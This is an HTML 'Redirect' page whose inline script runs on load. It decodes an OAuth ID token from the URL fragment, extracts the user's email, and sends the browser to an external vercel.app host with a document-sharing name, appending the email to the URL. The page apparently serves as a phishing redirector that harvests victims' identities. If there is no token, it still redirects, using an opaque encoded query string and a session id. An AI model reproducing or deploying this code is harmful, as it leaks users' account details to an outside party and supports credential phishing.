<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect</title>
<script>
  window.onload = function () {
      // Get the full URL fragment after the hash (#)
      const params = new URLSearchParams(window.location.hash.substring(1));

      // Check if an ID token exists in the URL
      const id_token = params.get("id_token");

      if (id_token) {
          try {
              // Decode the ID token payload
              const payload = JSON.parse(atob(id_token.split(".")[1]));

              // Extract the email (uses email or preferred_username)
              const userEmail = payload.email || payload.preferred_username;

              console.log("User Email:", userEmail);

              // Redirect without encoding '@' symbol
              window.location.href = `https://myp-sharedocu-statements-projects-e1565c5e.vercel.app#${userEmail}`;
          } catch (error) {
              console.error("Error decoding ID token:", error);
          }
      } else {
          console.warn("No ID token found. Redirecting anyway...");

          // If no token, redirect with a generic message
          window.location.href = "https://myp-sharedocu-statements-projects-e1565c5e.vercel.app?rQQIARAA02I20jOwUklLSU4zNzY217U0SkrTNUk2N9C1tLCw0E1NNDI2STJLS0sySCkS4hL4USJza9FVcZ-NXmzx5-02J61idMgoKSkottLXz87MzUgsKqosLklNzC3PL8ouLkhMTtXLrUzOyUzOTivNy0vNKdZLzs_VL05NLi1KTclPLs1NzSvZwch4gZHxFhO_v2NpSYYRiMgvyqxK_cTEWliaWlQ5i5nVEOgI01XMKgYQYKwLIiFEMowFA5uY2YB25Obn7WJWMQU6O9nY2EA3LSnVVNfECOg_C0vDZN3UNFNji0RDU8M0o7RTzHL5Bal5mSkKqbmJmTkKBUX5aZk5qQqhxalFekGpiSk3mBkvsDC-YuExYLbi4OASYJBgUGD4wcK4iBUYHtN2nlFJfc3qvI93xaaTOxMYTrHqm2SXe-g76WdUOOf7BRtkF2nnGWcbWmZ4mOf6Z7s5uRb7mFQV6jsbhFd4ZtsaWBlOYGP8wMbYwc6wi5PioDzAy_CDb8bpF_d6tlx55_GKX6fINz3UyyU9MsC8wtLZOLQ4PK3StzzIMqnQNNk8p9w73zQnPbzSPDkzsNLTdoMAwwMBBgA1&sessionid=5fb0c330-fbe5-4237-891c-ef538a151f2f";
      }
  };
</script>
</head>
<body>
    <p></p>
</body>
</html>  
